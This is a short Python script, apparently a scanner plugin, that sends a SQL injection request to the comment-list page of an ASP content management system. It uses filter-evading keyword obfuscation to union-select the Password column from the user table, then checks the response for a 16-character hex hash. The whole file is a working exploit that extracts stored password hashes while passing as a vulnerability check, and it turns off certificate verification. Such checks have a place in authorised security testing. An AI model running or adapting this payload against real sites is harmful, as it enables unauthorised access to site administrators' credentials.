import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand=randomInt(-200000, -100000)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20null,null,abs("+str(rand)+"),Password,1,null,1%20%20frmasterom%20{prefix}user"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(-rand) + " IP" in response.text and re.search("<div class=\"line2\">[0-9a-f]{16}</div>",response.text):
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
